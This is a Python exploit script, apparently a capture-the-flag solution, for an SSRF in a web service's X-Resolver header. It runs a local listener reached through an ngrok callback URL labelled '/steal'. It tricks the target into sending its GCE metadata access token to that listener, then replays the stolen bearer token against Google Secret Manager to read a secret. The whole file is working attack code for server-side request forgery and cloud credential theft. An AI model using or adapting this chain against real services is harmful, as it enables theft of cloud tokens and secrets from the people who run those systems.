#!/usr/bin/env python3
"""Cloudy with a Chance of Spaceships — CSSCTF web.

The hull-temperature board fetches a URL from the X-Resolver header
(base64 JSON {"resolver": "<url>"} with a leading "X") and reports
len(body)/10. The fetcher attaches the GCE metadata access token as
Authorization: Bearer. Point it at a listener, replay the token against
Secret Manager.
"""
import base64
import json
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TARGET = "http://34.116.80.78:9143"
PROJECT = "613713115850"
SECRET = "goog_encryption_secret"
# Public URL that forwards to this process. Replace with your own tunnel.
CALLBACK = "https://unfidgeting-angila-weevily.ngrok-free.dev/steal"

captured = {}


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        auth = self.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            captured["token"] = auth.split(" ", 1)[1]
        body = b"ok"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_):
        pass


def resolver_header(url: str) -> str:
    raw = json.dumps({"resolver": url}, separators=(",", ":")).encode()
    return "X" + base64.b64encode(raw).decode()


def main() -> None:
    server = ThreadingHTTPServer(("0.0.0.0", 8888), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

    req = urllib.request.Request(
        f"{TARGET}/api/v1/ship/Voyager%201/temperature",
        headers={"X-Resolver": resolver_header(CALLBACK)},
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        print("oracle", resp.read().decode())  # len("ok")/10 == 0.2

    for _ in range(20):
        if "token" in captured:
            break
        time.sleep(0.25)
    token = captured["token"]

    url = (
        "https://secretmanager.googleapis.com/v1/projects/"
        f"{PROJECT}/secrets/{SECRET}/versions/latest:access"
    )
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
    with urllib.request.urlopen(req, timeout=30) as resp:
        payload = json.load(resp)["payload"]["data"]
    print(base64.b64decode(payload).decode())
    server.shutdown()


if __name__ == "__main__":
    main()
